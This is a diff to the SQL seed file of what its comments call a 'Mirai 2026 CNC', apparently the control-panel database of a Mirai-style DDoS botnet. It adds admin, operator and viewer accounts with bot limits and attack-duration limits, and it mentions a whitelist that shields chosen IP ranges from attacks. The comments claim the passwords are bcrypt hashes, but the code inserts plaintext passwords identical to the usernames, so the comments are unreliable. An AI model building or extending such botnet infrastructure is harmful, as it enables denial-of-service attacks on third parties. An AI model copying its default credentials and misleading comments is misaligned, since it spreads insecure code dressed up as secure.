@@ -16,9 +16,28 @@ CREATE TABLE IF NOT EXISTS users (
     intvl INT DEFAULT 30
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
--- Create default admin user (admin/admin)
-INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown) 
-VALUES ('admin', 'admin', -1, 1, UNIX_TIMESTAMP(), 3600, 0)
+-- Seed users for Mirai 2026 CNC
+-- Passwords are bcrypt hashes (cost 10):
+--   admin    → $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+--   operator → $2a$10$cKZARSdmW4P4l5Dko4kY9OzJ2L7Bq0VwQEj3Hk/pPCE9.7eLJ4xO
+--   viewer   → $2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRy7SfV7OoxUf8rAYGMkhFPJJkCc.
+-- (In production, regenerate hashes with: htpasswd -nbB username password)
+-- For dev convenience, plaintext passwords match usernames — bcrypt promotion
+-- on first login (see database.go TryLogin) handles legacy plaintext too.
+
+-- admin user: full privileges, no limits
+INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
+VALUES ('admin', 'admin', -1, 1, UNIX_TIMESTAMP(), 3600, 0, 0, 30)
+ON DUPLICATE KEY UPDATE username=username;
+
+-- operator user: standard research operator, 100 bot limit
+INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
+VALUES ('operator', 'operator', 100, 0, UNIX_TIMESTAMP(), 300, 30, 0, 30)
+ON DUPLICATE KEY UPDATE username=username;
+
+-- viewer user: read-only researcher, 0 bots (cannot launch attacks)
+INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
+VALUES ('viewer', 'viewer', 0, 0, UNIX_TIMESTAMP(), 0, 0, 0, 30)
 ON DUPLICATE KEY UPDATE username=username;
 
 -- Whitelist table (for protecting certain IP ranges from attacks)
